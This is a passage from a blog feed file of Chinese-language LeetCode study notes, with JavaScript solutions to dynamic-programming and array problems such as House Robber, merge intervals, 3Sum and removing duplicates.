class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="打家劫舍"><a href="#打家劫舍" class="headerlink" title="打家劫舍"></a>打家劫舍</h2><ul><li><a href="https://leetcode-cn.com/problems/house-robber/" target="_blank" rel="noopener">leetcode198</a></li><li>由于不可以在相邻的房屋闯入，所以在当前位置 n 房屋可盗窃的最大值，要么就是 n-1 房屋可盗窃的最大值，要么就是 n-2 房屋可盗窃的最大值加上当前房屋的值，二者之间取最大值</li><li>状态转移方程：<code>dp[n] = max( dp[n-1], dp[n-2] + num )</code></li><li>举例来说：<code>[3,4,2]</code>，1 号房间可盗窃最大值为 3， 即为 <code>dp[1]=3</code>，2 号房间可盗窃最大值为 4， 即为 <code>dp[2]=4</code>，3 号房间自身的值为 2 即为 num=2，那么 <code>dp[3] = MAX( dp[2], dp[1] + num ) =  5</code>，3 号房间可盗窃最大值为 5</li><li>时间复杂度：O(n)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rob <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数组操作</title>
      <link href="2020/11/16/%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/16/%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li>合并区间</li><li>只出现一次的数字</li><li>找到所有数组中消失的数字</li><li>三数之和</li><li>数字数组去重排序</li><li>删除排序数组中的重复项</li><li>旋转矩阵</li><li>非递减数列</li><li>顺时针打印矩阵</li><li>最长湍流子数组</li></ul><h2 id="合并区间"><a href="#合并区间" class="headerlink" title="合并区间"></a>合并区间</h2><p>题目来源：<a href="https://leetcode-cn.com/problems/merge-intervals/" target="_blank" rel="noopener">leetcode56</a></p><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> intervals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">]</span>解释<span class="token punctuation">:</span> 区间 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> 和 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span> 重叠<span class="token punctuation">,</span> 将它们合并为 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> intervals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span>解释<span class="token punctuation">:</span> 区间 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span> 和 <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span> 可被视为重叠区间。</code></pre><ul><li>思路</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 1. 先按照 intervals[i][0] 从小到大排序</span><span class="token comment" spellcheck="true">// 2. intervals[i][1] >= intervals[i+1][1] 直接取 intervals[i][1] : [1,4] [2,3] 直接取 [1,4]</span><span class="token comment" spellcheck="true">// 3. intervals[i][1] >= intervals[i+1][0] 时 intervals[i][1] = intervals[i+1][1] ：[1,4] [3,5] 取 [1,5]  </span><span class="token comment" spellcheck="true">// 4. 设置一个 flag，如果此轮合并过，继续合并下一轮  </span></code></pre><ul><li>个人解法</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> merge <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>intervals<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token boolean">true</span>     intervals<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token boolean">false</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> intervals<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> intervals<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                intervals<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> intervals<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> intervals<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                intervals<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>             <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> intervals<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h2><ul><li><a href="https://leetcode-cn.com/problems/single-number/" target="_blank" rel="noopener">leetcode136</a></li></ul><pre class=" language-js"><code class="language-js">给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。说明：你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">1</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">4</span></code></pre><ul><li>任何数和 0 做异或运算，结果仍然是原来的数，</li><li>任何数和其自身做异或运算，结果是 0</li><li>异或运算满足交换律和结合律</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> singleNumber <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> nums<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> pre <span class="token operator">^</span> item<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="找到所有数组中消失的数字"><a href="#找到所有数组中消失的数字" class="headerlink" title="找到所有数组中消失的数字"></a>找到所有数组中消失的数字</h2><ul><li><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/" target="_blank" rel="noopener">leetcode448</a></li></ul><pre class=" language-js"><code class="language-js">给定一个范围在  <span class="token number">1</span> ≤ a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> ≤ n <span class="token punctuation">(</span> n <span class="token operator">=</span> 数组大小 <span class="token punctuation">)</span> 的 整型数组，数组中的元素一些出现了两次，另一些只出现一次。找到所有在 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">]</span> 范围之间没有出现在数组中的数字。<span class="token function">您能在不使用额外空间且时间复杂度为O</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>的情况下完成这个任务吗<span class="token operator">?</span> 你可以假定返回的数组不算在额外空间内。示例<span class="token punctuation">:</span>输入<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span></code></pre><ul><li>值表示索引</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> findDisappearedNumbers <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2><ul><li><a href="https://leetcode-cn.com/problems/3sum/" target="_blank" rel="noopener">leetcode15</a></li></ul><pre class=" language-js"><code class="language-js">给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">=</span> <span class="token number">0</span> ？请你找出所有满足条件且不重复的三元组。注意：答案中不可以包含重复的三元组。示例：给定数组 nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>，满足要求的三元组集合为：<span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><ul><li>双指针讲思路</li><li><a href="https://leetcode-cn.com/problems/3sum/solution/man-hua-jue-bu-wu-ren-zi-di-xiang-kuai-su-kan-dong/" target="_blank" rel="noopener">题解</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> threeSum <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    nums<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 排序</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span> <span class="token comment" spellcheck="true">// 基准值大于0时相加不可能等于0</span>        <span class="token keyword">let</span> i <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">let</span> j <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> j<span class="token operator">--</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> i<span class="token operator">++</span>            <span class="token comment" spellcheck="true">// 相加等于0时，需要去重</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ans<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ans<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">let</span> boolean <span class="token operator">=</span> <span class="token boolean">true</span>                    <span class="token comment" spellcheck="true">// ans中向前遍历，判断有没有一样的，有一样的就不 push 了</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> k <span class="token operator">=</span> ans<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ans<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">let</span> tmp <span class="token operator">=</span> ans<span class="token punctuation">[</span>k<span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> tmp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">===</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">===</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            boolean <span class="token operator">=</span> <span class="token boolean">false</span>                        <span class="token punctuation">}</span>                     <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span> <span class="token punctuation">{</span>                         ans<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>nums<span class="token punctuation">[</span>flag<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                i<span class="token operator">++</span>                j<span class="token operator">--</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="数字数组去重排序"><a href="#数字数组去重排序" class="headerlink" title="数字数组去重排序"></a>数字数组去重排序</h2><ul><li>用下标表示数字，空间复杂度较高，一般不建议使用</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">const</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>      res<span class="token punctuation">[</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>      ans<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> ans<span class="token punctuation">}</span></code></pre><h2 id="删除排序数组中的重复项"><a href="#删除排序数组中的重复项" class="headerlink" title="删除排序数组中的重复项"></a>删除排序数组中的重复项</h2><blockquote><p>示例 1:</p><p>给定数组 nums = [1,1,2], </p><p>函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 (注意只需修改，不需删除)</p><p>你不需要考虑数组中超出新长度后面的元素。</p><p>示例 2:</p><p>给定 nums = [0,0,1,1,1,2,2,3,3,4],</p><p>函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。</p><p>你不需要考虑数组中超出新长度后面的元素。</p></blockquote><ul><li>遍历一次，不重复的放在数组前几位，时间复杂度O（n)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeDuplicates <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span>nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> nums<span class="token punctuation">[</span>len<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> len<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><blockquote><p>给定 nums = [3,2,2,3], val = 3,</p><p>函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。</p><p>你不需要考虑数组中超出新长度后面的元素。</p><p>给定 nums = [0,1,2,2,3,0,4,2], val = 2,</p><p>函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。</p><p>注意这五个元素可为任意顺序。</p><p>你不需要考虑数组中超出新长度后面的元素。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeElement <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> val<span class="token punctuation">)</span> nums<span class="token punctuation">[</span>len<span class="token 